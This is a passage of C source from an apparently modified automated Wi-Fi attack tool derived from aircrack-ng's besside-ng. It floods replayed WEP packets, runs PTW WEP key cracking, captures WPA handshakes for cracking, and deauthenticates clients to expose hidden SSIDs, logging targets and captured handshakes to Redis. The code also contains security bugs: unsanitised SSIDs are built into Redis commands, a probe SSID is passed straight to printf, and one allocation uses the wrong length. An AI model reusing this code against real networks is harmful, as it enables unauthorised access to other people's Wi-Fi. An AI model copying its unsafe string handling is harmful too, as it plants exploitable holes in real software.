	memcpy(wh->i_addr1, n->n_bssid, sizeof(wh->i_addr1));
	memcpy(wh->i_addr2, _state.s_mac, sizeof(wh->i_addr2));
	memcpy(wh->i_addr3, n->n_bssid, sizeof(wh->i_addr3));

	wh->i_fc[0] |= IEEE80211_FC0_TYPE_MGT | stype;

	*rc++ = htole16(IEEE80211_CAPINFO_ESS | IEEE80211_CAPINFO_PRIVACY
			| IEEE80211_CAPINFO_SHORT_PREAMBLE);
	*rc++ = htole16(0);

	p = (unsigned char*) rc;

	if (stype == IEEE80211_FC0_SUBTYPE_REASSOC_REQ) {
		memcpy(p, n->n_bssid, sizeof(n->n_bssid));
		p += sizeof(n->n_bssid);
	}

	*p++ = IEEE80211_ELEMID_SSID;
	*p++ = strlen(n->n_ssid);
	memcpy(p, n->n_ssid, strlen(n->n_ssid));
	p += strlen(n->n_ssid);

        // rates
        *p++ = IEEE80211_ELEMID_RATES;
        *p++ = 8;
        *p++ = 2 | 0x80;
        *p++ = 4 | 0x80;
        *p++ = 11 | 0x80;
        *p++ = 22 | 0x80;
        *p++ = 12 | 0x80;
        *p++ = 24 | 0x80;
        *p++ = 48 | 0x80;
        *p++ = 72;

        /* x-rates */
        *p++ = IEEE80211_ELEMID_XRATES;
        *p++ = 4;
        *p++ = 48;
        *p++ = 72;
        *p++ = 96;
        *p++ = 108;

	wifi_send(wh, (unsigned long) p - (unsigned long) wh);
}

static void network_assoc(void *a)
{
	struct network *n = a;

	if (_state.s_state != STATE_ATTACK ||
	    _state.s_curnet != n
	    || n->n_wstate != WSTATE_AUTH)
		return;

	do_assoc(n, IEEE80211_FC0_SUBTYPE_ASSOC_REQ);

	time_printf(V_VERBOSE, "Associating...\n");

	timer_in(_conf.cf_to * 1000, network_assoc, n);
}

static int need_connect(struct network *n)
{
	if (n->n_crypto == CRYPTO_WPA)
		return 0;

	switch (n->n_astate) {
	case ASTATE_READY:
	case ASTATE_WEP_PRGA_GET:
	case ASTATE_WEP_FLOOD:
		return 1;

	default:
		return 0;
	}
}

static int network_connect(struct network *n)
{
	switch (n->n_wstate) {
	case WSTATE_NONE:
		network_auth(n);
		break;

	case WSTATE_AUTH:
		network_assoc(n);
		break;

	case WSTATE_ASSOC:
		return 1;
	}

	return 0;
}

static void prga_get(struct network *n)
{
	if (n->n_replay_len) {
		n->n_astate = ASTATE_WEP_FLOOD;
		attack_continue(n);
		return;
	}
}

static void speed_add(struct speed *s)
{
	if (s->s_start.tv_sec == 0)
		memcpy(&s->s_start, &_state.s_now, sizeof(s->s_start));

	s->s_num++;
}

static void speed_calculate(struct speed *s)
{
	int diff = time_diff(&s->s_start, &_state.s_now);

	if (diff < (1000 * 1000))
		return;

	s->s_speed = (int) ((double) s->s_num /
		     ((double) diff / 1000.0 / 1000.0));

	memcpy(&s->s_start, &_state.s_now, sizeof(s->s_start));
		s->s_num = 0;
}

static void do_flood(struct network *n)
{
	struct ieee80211_frame *wh = (struct ieee80211_frame*) n->n_replay;

	if (!network_connect(n))
		return;

	memcpy(wh->i_addr2, _state.s_mac, sizeof(wh->i_addr2));

	wifi_send(n->n_replay, n->n_replay_len);
	speed_add(&n->n_flood_out);
}

static void wep_flood(void *a)
{
	struct network *n = a;

	if (_state.s_state != STATE_ATTACK
	    || _state.s_curnet != n
	    || n->n_astate != ASTATE_WEP_FLOOD)
		return;

	do_flood(n);

	timer_in(_conf.cf_floodfreq, wep_flood, n);
}

static void replay_check(void *a)
{
	struct network *n = a;

	if (_state.s_state != STATE_ATTACK
	    || _state.s_curnet != n
	    || n->n_astate != ASTATE_WEP_FLOOD)
		return;

	if (n->n_replay_got > 3)
		return;

	n->n_replay_len = 0;
	n->n_astate = ASTATE_WEP_PRGA_GET;
}

static void start_flood(struct network *n)
{
	n->n_replay_got = 0; /* refresh replay packet if it sucks */

	timer_in(5 * 1000 * 1000, replay_check, n);
	wep_flood(n);
}

static void attack_wep(struct network *n)
{
	if (!n->n_ssid[0]) {
		n->n_astate = ASTATE_DEAUTH;
		deauth(n);
		return;
	}

	if (!network_connect(n))
		return;

	switch (n->n_astate) {
	case ASTATE_READY:
		n->n_astate = ASTATE_WEP_PRGA_GET;
		/* fallthrough */
	case ASTATE_WEP_PRGA_GET:
		prga_get(n);
		break;

	case ASTATE_WEP_FLOOD:
		start_flood(n);
		break;
	}
}

static void attack_continue(struct network *n)
{
	if (_state.s_state != STATE_ATTACK
            || _state.s_curnet != n)
		return;

	switch (n->n_astate) {
	case ASTATE_NONE:
		n->n_astate = ASTATE_PING;
		/* fall through */
	case ASTATE_PING:
		n->n_ping_got = n->n_ping_sent = 0;
		attack_ping(n);
		return;

	case ASTATE_DONE:
		pwned(n);
		/* fallthrough */
	case ASTATE_UNREACH:
		if (_conf.cf_bssid)
			_state.s_state = STATE_DONE;
		else
			attack_next();
		return;
	}

	switch (n->n_crypto) {
	case CRYPTO_WPA:
		attack_wpa(n);
		break;

	case CRYPTO_WEP:
		attack_wep(n);
		break;
	}
}

static void attack(struct network *n)
{
    char *redis_cmd = "HINCRBY session_stats attack_count 1";
	redisReply *reply;
    _state.s_curnet = n;
	_state.s_state  = STATE_ATTACK;

	channel_set(n->n_chan);

	time_printf(V_VERBOSE,
        "Pwning [%s] %s on chanel %d\n",
        n->n_ssid,
        mac2str(n->n_bssid),
        n->n_chan
    );
    //attack_count
    reply = redisCommand(redis_context, redis_cmd);
    freeReplyObject(reply);

	if (n->n_start.tv_sec == 0)
		memcpy(&n->n_start, &_state.s_now, sizeof(n->n_start));

	if (!_conf.cf_bssid)
		timer_in(_conf.cf_attackwait * 1000 * 1000, attack_watchdog, n);

	n->n_attempts++;

	attack_continue(n);
}

static void found_new_network(struct network *n)
{
    /*
     *
     */
	struct client *c = n->n_clients.c_next;
    char *redis_cmd;
    char *format;
    const char *crypto;
    int len;
    redisReply *reply;
    crypto = crypto_to_string(n);
    // TODO: skip broadcast and skip rouge aps

    format = "HMSET access_point_%s ssid '%s' crypto %s bssid %s channel %d";
    len = snprintf(NULL, 0, format, mac2str(n->n_bssid), n->n_ssid, crypto, mac2str(n->n_bssid), n->n_chan);
    redis_cmd = (char *)malloc(len + 1);
    sprintf(redis_cmd, format, mac2str(n->n_bssid), n->n_ssid, crypto, mac2str(n->n_bssid), n->n_chan);

    reply = redisCommand(redis_context, redis_cmd);
    freeReplyObject(reply);
    format = "HINCRBY session_stats %s 1";
    len = snprintf(NULL, 0, format, mac2str(n->n_bssid), crypto);
    free(redis_cmd);
    redis_cmd = (char *)malloc(len + 1);
    sprintf(redis_cmd, format, crypto);
    reply = redisCommand(redis_context, redis_cmd);
    freeReplyObject(reply);
    free(redis_cmd);

    /*printf("%s", redis_cmd);
    printf("SET: %s\n", reply->str);*/

	network_print(n);

	while (c) {
		found_new_client(n, c);
		c = c->c_next;
	}

	if (_conf.cf_bssid &&
	    memcmp(n->n_bssid, _conf.cf_bssid, sizeof(n->n_bssid)) == 0) {
		if (should_attack(n)) {
			attack(n);
		} else {
			time_printf(V_NORMAL, "Can't attack %s\n", n->n_ssid);
			_state.s_state = STATE_DONE;
		}
	}
}

static void packet_copy(struct packet *p, void *d, int len)
{
	assert(len <= (int) sizeof(p->p_data));

	p->p_len = len;
	memcpy(p->p_data, d, len);
}

static void packet_write_pcap(int fd, struct packet *p);

static void found_ssid(struct network *n)
{
	unsigned char *p;
	int ssidlen;
	int origlen;

	time_printf(V_NORMAL, "Found SSID [%s] for %s\n",
		    n->n_ssid, mac2str(n->n_bssid));

	/* beacon surgery */
	p = n->n_beacon.p_data + sizeof(struct ieee80211_frame) + 8 + 2 + 2;

	ssidlen = strlen(n->n_ssid);
	assert((n->n_beacon.p_len + ssidlen) <=
	       (int) sizeof(n->n_beacon.p_data));

	assert(*p == IEEE80211_ELEMID_SSID);
	p++;

	origlen = *p;
	*p++    = ssidlen;

	assert(origlen == 0 || p[0] == 0);

	memmove(p + ssidlen, p + origlen,
		n->n_beacon.p_len - (p + origlen - n->n_beacon.p_data));
	memcpy(p, n->n_ssid, ssidlen);

	n->n_beacon.p_len += ssidlen - origlen;

	if (n->n_client_handshake) {
		n->n_astate = ASTATE_WPA_CRACK;
		attack_continue(n);
	}

	if (n->n_crypto == CRYPTO_WEP) {
		n->n_astate = ASTATE_READY;
		attack_continue(n);
	}
}

static int parse_rsn(struct network *n, unsigned char *p, int l, int rsn)
{
	int c;
	unsigned char *start = p;
	int psk = 0;

	if (l < 2)
		return 0;

	if (memcmp(p, "\x01\x00", 2) != 0)
		return 0;

	n->n_crypto = CRYPTO_WPA;

	if (l < 8)
		return -1;

	p += 2;
	p += 4;

	/* cipher */
	c = le16toh(*((uint16_t*) p));

	p += 2 + 4 * c;

	if (l < ((p - start) + 2))
		return -1;

	/* auth */
	c = le16toh(*((uint16_t*) p));
	p += 2;

	if (l < ((p - start) + c * 4))
		return -1;

	while (c--) {
		if (rsn && memcmp(p, "\x00\x0f\xac\x02", 4) == 0)
			psk++;

		if (!rsn && memcmp(p, "\x00\x50\xf2\x02", 4) == 0)
			psk++;

		p += 4;
	}

	assert(l >= (p - start));

	if (!psk)
		n->n_crypto = CRYPTO_WPA_MGT;

	return 0;
}

static int parse_elem_vendor(struct network *n, unsigned char *e, int l)
{
	struct ieee80211_ie_wpa *wpa = (struct ieee80211_ie_wpa*) e;

	if (l < 5)
		return 0;

	if (memcmp(wpa->wpa_oui, "\x00\x50\xf2", 3) != 0)
		return 0;

	if (l < 8)
		return 0;

	if (wpa->wpa_type != WPA_OUI_TYPE)
		return 0;

	return parse_rsn(n, (unsigned char*) &wpa->wpa_version, l - 6, 0);
}

static void wifi_probe_request(struct ieee80211_frame *wh, int totlen) {

	unsigned char *p = (unsigned char*) (wh + 1);
    char *probe_ssid;
    int n, i;

    //cmd_len = snprintf(NULL, 0, format, mac2str(c->c_mac));
    //redis_cmd = (char *) malloc(len + 1);
    //sprintf(redis_cmd, format, mac2str(c->c_mac));
    //redisCommand(redis_context, redis_cmd);
    // TODO: client_positions_%s % bssid
    // access_point_{0}_client_{1}_last_time_seen'.format(bssid, station_mac)
    //
	while (p < wh + totlen) {
        if( p + 2 + p[1] > wh + totlen )
            break;

        if( p[0] == 0x00 && p[1] > 0 && p[2] != '\0' &&
                                ( p[1] > 1 || p[2] != ' ' ) ) {
            for( i = 0; i < n; i++ ) {
                if( p[2 + i] > 0 && p[2 + i] < ' ' ) {

                }
            }
            n = p[1];
            printf("probe size: %d \n", n);
            printf("ssid ->");
            probe_ssid = (char *)malloc(n * sizeof(char));
            memcpy(probe_ssid, p + 2, n );
            printf(probe_ssid);
            printf("<-\n");
            free(probe_ssid);
        }
        p += 2 + p[1];

    }

}

static void wifi_beacon(struct network *n, struct ieee80211_frame *wh,
			int totlen)
{
	unsigned char *p = (unsigned char*) (wh + 1);
	int bhlen = 8 + 2 + 2;
	int new = 0;
	int len = totlen;
	int hidden = 0;
	int ssids = 0;

	totlen -= sizeof(*wh);

	if (totlen < bhlen)
		goto __bad;

        if (!(IEEE80211_BEACON_CAPABILITY(p) & IEEE80211_CAPINFO_PRIVACY))
		return;

	if (!n->n_have_beacon)
		new = 1;

	n->n_have_beacon = 1;
	n->n_crypto	 = CRYPTO_WEP;
	n->n_dbm	 = _state.s_ri->ri_power;

	p      += bhlen;
	totlen -= bhlen;

	while (totlen > 2) {
		int id = *p++;
		int l  = *p++;

		totlen -= 2;

		if (totlen < l)
			goto __bad;

		switch (id) {
            case IEEE80211_ELEMID_SSID:
                if (++ssids > 1)
                    break;

                if (l == 0 || p[0] == 0)
                    hidden = 1;
                else {
                    memcpy(n->n_ssid, p, l);
                    n->n_ssid[l] = 0;
                }
                break;

            case IEEE80211_ELEMID_DSPARMS:
                n->n_chan = *p;
                break;

            case IEEE80211_ELEMID_VENDOR:
                if (parse_elem_vendor(n, &p[-2], l + 2) == -1)
                    goto __bad;
                break;

            case IEEE80211_ELEMID_RSN:
                if (parse_rsn(n, p, l, 1) == -1)
                    goto __bad;
                break;
            case IEEE80211_ELEMID_HTINFO:
                n->n_chan = *p;
                break;
            default:
    //			printf("id %d len %d\n", id, l);
                break;
		}

		p      += l;
		totlen -= l;
	}

	if (new) {

		packet_copy(&n->n_beacon, wh, len);
		found_new_network(n);

		if (hidden && n->n_ssid[0])
			found_ssid(n);

		if (ssids > 1 && should_attack(n)) {
			time_printf(V_NORMAL,
			    	    "WARNING: unsupported multiple SSIDs"
			    	    " for network %s [%s]\n",
				    mac2str(n->n_bssid), n->n_ssid);
		}
	}

	return;
__bad:
	printf("\nBad beacon\n");
}

static int for_us(struct ieee80211_frame *wh)
{
	return memcmp(wh->i_addr1, _state.s_mac, sizeof(wh->i_addr1)) == 0;
}

static void has_mac_filter(struct network *n)
{
	time_printf(V_VERBOSE, "MAC address filter on %s\n", n->n_ssid);
	n->n_mac_filter = 1;
}

static void wifi_auth(struct network *n, struct ieee80211_frame *wh,
		      int len)
{
	uint16_t *p = (uint16_t*) (wh + 1);
	int rc;

	if (len < (int) (sizeof(*wh) + 2 + 2 + 2))
		goto __bad;

	rc = le16toh(p[2]);

	if (for_us(wh) && rc != 0) {
		if (!n->n_mac_filter)
			has_mac_filter(n);
	}

	if (for_us(wh) && n->n_astate == ASTATE_PING) {
		ping_reply(n, wh);
		return;
	}

	if (for_us(wh) && n->n_wstate == ASTATE_NONE && need_connect(n)) {
		if (le16toh(p[0]) != 0 || le16toh(p[1]) != 2)
			return;

		if (le16toh(p[2]) == 0) {
			n->n_wstate = WSTATE_AUTH;
			time_printf(V_VERBOSE, "Authenticated\n");
			network_connect(n);
		}
	}

	return;
__bad:
	printf("Bad auth\n");
}

static void found_mac(struct network *n)
{
	if (!n->n_mac_filter || n->n_got_mac)
		return;

	assert(n->n_client_mac);

	time_printf(V_NORMAL, "Found MAC %s for %s\n",
		    mac2str(n->n_client_mac->c_mac),
		    n->n_ssid);

	n->n_got_mac = 1;
}

static void wifi_assoc_resp(struct network *n, struct ieee80211_frame *wh,
		            int len)
{
	uint16_t *p = (uint16_t*) (wh + 1);

	if (len < (int) (sizeof(*wh) + 2 + 2 + 2))
		goto __bad;

	if (for_us(wh) && n->n_wstate == WSTATE_AUTH) {
		if (le16toh(p[1]) == 0) {
			int aid = le16toh(p[2]) & 0x3FFF;

			n->n_wstate = WSTATE_ASSOC;
			time_printf(V_NORMAL, "Associated to %s AID [%d]\n",
				    n->n_ssid, aid);

			found_mac(n);

			attack_continue(n);
		} else
			time_printf(V_NORMAL, "Assoc died %d\n", le16toh(p[1]));
	}

	return;
__bad:
	printf("Bad assoc resp\n");
}

static void grab_hidden_ssid(struct network *n, struct ieee80211_frame *wh,
			     int len, int off)
{
	unsigned char *p = ((unsigned char *)(wh + 1)) + off;
	int l;

	if (n->n_ssid[0])
		return;

	len -= sizeof(*wh) + off + 2;

	if (len < 0)
		goto __bad;

	if (*p++ != IEEE80211_ELEMID_SSID)
		goto __bad;

	l = *p++;
	if (l > len)
		goto __bad;

	if (l == 0)
		return;

	memcpy(n->n_ssid, p, l);
	n->n_ssid[l] = 0;

	if (!n->n_have_beacon)
		return;

	found_ssid(n);
	return;
__bad:
	printf("\nbad grab_hidden_ssid\n");
	return;
}

static void wifi_mgt(struct network *n, struct ieee80211_frame *wh, int len)
{
	switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {
    //case IEEE80211_FC0_SUBTYPE_PROBE_REQ:
    //    wifi_probe_request(wh, len);

	case IEEE80211_FC0_SUBTYPE_BEACON:
		wifi_beacon(n, wh, len);

	case IEEE80211_FC0_SUBTYPE_AUTH:
		wifi_auth(n, wh, len);
		break;

	case IEEE80211_FC0_SUBTYPE_ASSOC_RESP:
		wifi_assoc_resp(n, wh, len);
		break;

	case IEEE80211_FC0_SUBTYPE_DEAUTH:
		if (for_us(wh) && need_connect(n)) {
			time_printf(V_VERBOSE, "Got deauth for %s\n",
				    n->n_ssid);
			n->n_wstate = WSTATE_NONE;
			network_connect(n);
		}
		break;

	case IEEE80211_FC0_SUBTYPE_ASSOC_REQ:
		grab_hidden_ssid(n, wh, len, 2 + 2);
		break;

	case IEEE80211_FC0_SUBTYPE_REASSOC_REQ:
		grab_hidden_ssid(n, wh, len, 2 + 2 + 6);
		break;

	case IEEE80211_FC0_SUBTYPE_PROBE_RESP:
		grab_hidden_ssid(n, wh, len, 8 + 2 + 2);
		break;

	default:
		if (for_us(wh)) {
			printf("UNHANDLED MGMT %d\n",
		               (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK)
			       >> IEEE80211_FC0_SUBTYPE_SHIFT);
		}
		break;
	}
}

static void wifi_ctl(struct ieee80211_frame *wh, int len)
{
//	printf("ctl\n");

	if (wh && len) {}
}

static unsigned char *get_client_mac(struct ieee80211_frame *wh)
{
	unsigned char *bssid = get_bssid(wh);
	int type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;

	if (type == IEEE80211_FC0_TYPE_CTL)
		return NULL;

	if (!bssid)
		return wh->i_addr2;

	if (bssid == wh->i_addr1)
		return wh->i_addr2;
	else
		return wh->i_addr1;
}

static struct client *client_get(struct network *n, struct ieee80211_frame *wh)
{
    /*
     * Given the network and the 80211 frame, check if the client was already found
     * if not it returns NULL.
     */
	struct client *c = n->n_clients.c_next;
	unsigned char *cmac = get_client_mac(wh);

	if (!cmac)
		return NULL;

	while (c) {
		if (memcmp(c->c_mac, cmac, 6) == 0)
			return c;

		c = c->c_next;
	}

	return NULL;
}

static struct client *client_update(struct network *n,
				    struct ieee80211_frame *wh)
{
    /*
     *
     */
	unsigned char *cmac = get_client_mac(wh);
	struct client *c;
	int type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;

	if (!cmac)
		return NULL;

	/* let's not pwn ourselves */
	if (memcmp(cmac, _state.s_mac, sizeof(_state.s_mac)) == 0)
		return NULL;

	if (cmac == wh->i_addr1) {
		if (memcmp(cmac, BROADCAST, 6) == 0)
			return NULL;

		/* multicast */
		if (memcmp(cmac, "\x01\x00\x5e", 3) == 0)
			return NULL;

		/* ipv6 multicast */
		if (memcmp(cmac, "\x33\x33", 2) == 0)
			return NULL;

		/* MAC PAUSE */
		if (memcmp(cmac, "\x01\x80\xC2", 3) == 0)
			return NULL;

		/* fuck it */
		if (cmac[0] == 0x01)
			return NULL;
	}

	/* here we can choose how conservative to be */
	if (type == IEEE80211_FC0_TYPE_MGT) {
		switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {
		case IEEE80211_FC0_SUBTYPE_ASSOC_RESP:
			break;

		case IEEE80211_FC0_SUBTYPE_PROBE_RESP:
		default:
			return NULL;
		}
	}

	c = client_get(n, wh);
    // client_get returns NULL if it was not found.
	if (!c) {
        attach_client_to_network(n, cmac);
	}

	return c;
}

static int eapol_handshake_step(unsigned char *eapol, int len)
{
	int eapol_size = 4 + 1 + 2 + 2 + 8 + 32 + 16 + 8 + 8 + 16 + 2;

	if (len < eapol_size)
		return 0;

	/* not pairwise */
	if ((eapol[6] & 0x08) == 0)
		return 0;

	/* 1: has no mic */
	if ((eapol[5] & 1) == 0)
		return 1;

	/* 3: has ack */
	if ((eapol[6] & 0x80) != 0)
		return 3;

	if (*((uint16_t*) &eapol[eapol_size - 2]) == 0)
		return 4;

	return 2;
}

static void process_eapol(struct network *n, struct client *c, unsigned char *p,
			  int len, struct ieee80211_frame *wh, int totlen)
{
	int cmd_len, num, i;
    char *format;
    char *redis_cmd;
    redisReply *reply;

	if (n->n_client_handshake)
		return;

	num = eapol_handshake_step(p, len);
	if (num == 0)
		return;

	/* reset... should use time, too.  XXX conservative - check retry */
	if (c->c_wpa == 0 || num <= c->c_wpa) {
		for (i = 0; i < 4; i++)
			c->c_handshake[i].p_len = 0;

		c->c_wpa_got = 0;
	}

	c->c_wpa = num;

	switch (num) {
	case 1:
		c->c_wpa_got |= 1;
		break;

	case 2:
		c->c_wpa_got |= 2;
		c->c_wpa_got |= 4;
		break;

	case 3:
		if (memcmp(&p[17], ZERO, 32) != 0)
			c->c_wpa_got |= 1;

		c->c_wpa_got |= 4;
		break;

	case 4:
		if (memcmp(&p[17], ZERO, 32) != 0)
			c->c_wpa_got |= 2;

		c->c_wpa_got |= 4;
		break;

	default:
		abort();
	}

	packet_copy(&c->c_handshake[num - 1], wh, totlen);

	time_printf(V_VERBOSE,
		    "Got WPA handshake step %d (have %d) for %s\n",
		    num, c->c_wpa_got, n->n_ssid);

	if (c->c_wpa_got == 7) {
		n->n_client_handshake = c;
        // increment session stats 4way handshake found.
        reply = redisCommand(redis_context, "HINCRBY session_stats 4way 1");
        freeReplyObject(reply);
        format = "SADD bssid_white_list %s";
        printf("Added to white list\n");
        cmd_len = snprintf(NULL, 0, format, mac2str(c->c_mac));
        redis_cmd = (char *) malloc(len + 1);
        sprintf(redis_cmd, format, mac2str(c->c_mac));
        reply = redisCommand(redis_context, redis_cmd);
        freeReplyObject(reply);

		time_printf(V_NORMAL,
			    "Got necessary WPA handshake info for %s\n",
			    n->n_ssid);

		n->n_client_mac = c;
		found_mac(n);
        save_handshakes(n);
		if (n->n_ssid[0]) {
			n->n_astate = ASTATE_WPA_CRACK;
			attack_continue(n);
		}
        free(redis_cmd);
	}
}

static int is_replayable(struct ieee80211_frame *wh, int len)
{
        unsigned char clear[2048];
        int dlen = len - 4 - 4;
        int clearsize;
        int weight[16];

        known_clear(clear, &clearsize, weight, (void*) wh, dlen);
        if (clearsize < 16)
                return 0;

	return 1;
}

static void get_replayable(struct network *n, struct ieee80211_frame *wh,
			   unsigned char *body, int len)
{
	if (!is_replayable(wh, len))
		return;

	if (n->n_replay_len)
		return;

	n->n_replay_got = 0;

	assert(len + sizeof(*wh) <= (int) sizeof(n->n_replay));

	memcpy(&n->n_replay[sizeof(*wh)], body, len);
	n->n_replay_len = len + sizeof(*wh);

	wh = (struct ieee80211_frame*) n->n_replay;
	fill_basic(n, wh);
	memcpy(wh->i_addr1, n->n_bssid, sizeof(wh->i_addr1));
	memcpy(wh->i_addr2, _state.s_mac, sizeof(wh->i_addr3));
	memcpy(wh->i_addr3, BROADCAST, sizeof(wh->i_addr3));

	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS | IEEE80211_FC1_WEP;

	time_printf(V_NORMAL, "Got replayable packet for %s [len %d]\n",
		    n->n_ssid, len - 4 - 4);

	if (_state.s_state == STATE_ATTACK
	    && _state.s_curnet == n
	    && n->n_astate == ASTATE_WEP_PRGA_GET)
		attack_continue(n);
}

static void check_replay(struct network *n, struct ieee80211_frame *wh, int len)
{
	if (_state.s_state != STATE_ATTACK
	    || _state.s_curnet != n
	    || n->n_astate != ASTATE_WEP_FLOOD)
		return;

	if (!(wh->i_fc[1] |= IEEE80211_FC1_DIR_FROMDS))
		return;

	if (memcmp(wh->i_addr3, _state.s_mac, sizeof(wh->i_addr3)) != 0)
		return;

	if (len != (int) (n->n_replay_len - sizeof(*wh)))
		return;

	n->n_replay_got++;
	memcpy(&n->n_replay_last, &_state.s_now, sizeof(n->n_replay_last));

	// ack clocked
	do_flood(n);
}

static void do_wep_crack(struct cracker *c, struct network *n, int len,
			 int limit)
{
	ssize_t unused;

        unsigned char key[PTW_KEYHSBYTES];
        int (*all)[256];
        int i, j;

        all = xmalloc(256 * 32 * sizeof(int));

        //initial setup (complete keyspace)
        for (i = 0; i < 32; i++) {
            for (j = 0; j < 256; j++)
                all[i][j] = 1;
        }

        if (PTW_computeKey(n->n_ptw, key, len, limit, PTW_DEFAULTBF, all, 0)
	    != 1) {
            free(all);
		    return;
        }

	unused = write(c->cr_pipe[1], key, len);
    free(all);
}

static void crack_wep64(struct cracker *c, struct network *n)
{
	do_wep_crack(c, n, 5, KEYLIMIT / 10);
}

static void crack_wep128(struct cracker *c, struct network *n)
{
	do_wep_crack(c, n, 13, KEYLIMIT);
}

static void cracker_start(struct cracker *c, cracker_cb cb, struct network *n)
{
	if (pipe(c->cr_pipe) == -1)
		err(1, "pipe()");

	c->cr_pid = fork();
	if (c->cr_pid == -1)
		err(1, "fork()");

	if (c->cr_pid) {
		/* parent */
		close(c->cr_pipe[1]);
	} else {
		/* child */
		close(c->cr_pipe[0]);
		cb(c, n);
		exit(0);
	}
}

static void wep_crack_start(struct network *n)
{
	cracker_kill(&n->n_cracker_wep[0]);
	cracker_kill(&n->n_cracker_wep[1]);

	cracker_start(&n->n_cracker_wep[0], crack_wep64, n);
	cracker_start(&n->n_cracker_wep[1], crack_wep128, n);
}

static void wep_crack(struct network *n)
{
	if (_state.s_state != STATE_ATTACK
	    || _state.s_curnet != n
	    || n->n_astate != ASTATE_WEP_FLOOD) {
		n->n_crack_next = n->n_data_count + 1;
		return;
	}

	wep_crack_start(n);

	n->n_crack_next += _conf.cf_crack_int;
}

static int ptw_add(struct network *n, struct ieee80211_frame *wh,
		   unsigned char *body, int len)
{
        unsigned char clear[2048];
        int dlen = len - 4 - 4;
        int clearsize;
        int i, weight[16], k, j;
	int rc = 0;

        k = known_clear(clear, &clearsize, weight, (void*) wh, dlen);
        if (clearsize < 16)
                return rc;

        for (j = 0; j < k; j++) {
            for (i = 0; i < clearsize; i++)
                    clear[i + (32 * j)] ^= body[4 + i];
        }

	if (!n->n_ptw) {
		n->n_ptw = PTW_newattackstate();
		if (!n->n_ptw)
			err(1, "PTW_newattackstate()");
	}

        if (PTW_addsession(n->n_ptw, body, clear, weight, k)) {
		speed_add(&n->n_flood_in);
		n->n_data_count++;
		rc = 1;
	}

	if (n->n_data_count == n->n_crack_next)
		wep_crack(n);

	return rc;
}

static void ptw_free(struct network *n)
{
	if (n->n_ptw) {
		PTW_freeattackstate(n->n_ptw);
		n->n_ptw = NULL;
	}
}

static void wifi_data(struct network *n, struct ieee80211_frame *wh, int len)
{
	unsigned char *p = (unsigned char*) (wh + 1);
        struct llc* llc;
	int wep = wh->i_fc[1] & IEEE80211_FC1_WEP;
	int eapol = 0;
	struct client *c;
	int stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;
	int orig = len;

	assert(n);

	len -= sizeof(*wh);

	if (stype == IEEE80211_FC0_SUBTYPE_QOS) {
		p   += 2;
		len -= 2;
	}

	if (!wep && len >= 8) {
		llc = (struct llc*) p;

		eapol = memcmp(llc, "\xaa\xaa\x03\x00\x00\x00\x88\x8e", 8) == 0;

		p   += 8;
		len -= 8;
	}

	if (!wep && !eapol)
		return;

	if (!n->n_have_beacon) {
		n->n_chan   = _state.s_chan;
		n->n_crypto = eapol ? CRYPTO_WPA : CRYPTO_WEP;

		/* XXX */
		if (n->n_crypto == CRYPTO_WEP && p[3] != 0)
			n->n_crypto = CRYPTO_WPA;
	}

	if (eapol) {
		c = client_get(n, wh);

		/* c can be null if using our MAC (e.g., VAPs) */
		if (c)
			process_eapol(n, c, p, len, wh, orig);
		return;
	}

	if (n->n_crypto != CRYPTO_WEP) {
		ptw_free(n);
		return;
	}

	if (len < (4 + 4))
		return;

	if (n->n_astate == ASTATE_DONE)
		return;

	get_replayable(n, wh, p, len);

	check_replay(n, wh, len);

	if (ptw_add(n, wh, p, len)) {
		if (n->n_have_beacon && !n->n_beacon_wrote) {
			packet_write_pcap(_state.s_wepfd, &n->n_beacon);

			n->n_beacon_wrote = 1;
		}

		write_pcap(_state.s_wepfd, wh, orig);
	}
}

static struct network *network_update(struct ieee80211_frame* wh)
{
    /*
     *
     */
	struct network *n;
	struct client  *c = NULL;
	unsigned char *bssid;
	int fromnet;

	bssid = get_bssid(wh);
	if (!bssid)
		return NULL;

	n = network_get(wh);
    // network_get return NULL if not found in state struct
	if (!n)
        //not found. add a new one
		n = network_add(wh);

	assert(n);

	if ((fromnet = (memcmp(wh->i_addr2, bssid, sizeof(wh->i_addr2)) == 0)))
		n->n_dbm = _state.s_ri->ri_power;

	c = client_update(n, wh);
	if (c && !fromnet)
		c->c_dbm = _state.s_ri->ri_power;

	return n;
}

static void wifi_read()
{
	struct state *s = &_state;
	unsigned char buf[2048];
	int rd;
	struct rx_info ri;
    struct ieee80211_frame* wh = (struct ieee80211_frame*) buf;
	struct network *n;

	memset(buf, 0, sizeof(buf));

	rd = wi_read(s->s_wi, buf, sizeof(buf), &ri);
	if (rd < 0)
		err(1, "wi_read()");

	if (rd < sizeof(struct ieee80211_frame)) {
		return;
	}

	s->s_ri = &ri;

	n = network_update(wh);

	switch (wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK) {
        case IEEE80211_FC0_TYPE_MGT:
            wifi_mgt(n, wh, rd);
            break;

        case IEEE80211_FC0_TYPE_CTL:
            wifi_ctl(wh, rd);
            break;

        case IEEE80211_FC0_TYPE_DATA:
            wifi_data(n, wh, rd);
            break;

        default:
            printf("Unknown type %d\n", wh->i_fc[0]);
        }
}

static const char *astate2str(int astate)
{
	static char num[16];
	static char *states[] = {
		"NONE",
		"PING",
		"READY",
		"DEAUTH",
		"WPA_CRACK",
		"GET REPLAY",
		"FLOOD",
		"NONE",
		"DONE" };

	if (astate >= (int) (sizeof(states) / sizeof(*states))) {
		snprintf(num, sizeof(num), "%d", astate);
		return num;
	}

	return states[astate];
}

static const char *wstate2str(int astate)
{
	static char num[16];
	static char *states[] = {
		"NONE",
		"AUTH",
		"ASSOC" };

	if (astate >= (int) (sizeof(states) / sizeof(*states))) {
		snprintf(num, sizeof(num), "%d", astate);
		return num;
	}

	return states[astate];
}

static void print_status(int advance)
{
	static char status[]  = "|/-|/-\\";
	static char *statusp = status;
	struct network *n = _state.s_curnet;
	struct client *c;
	int ccount = 0;

	time_printf(V_NORMAL, "%c", *statusp);

	switch (_state.s_state) {
        case STATE_SCAN:
            printf(" Scanning chan %.2d", _state.s_chan);
            break;

        case STATE_ATTACK:
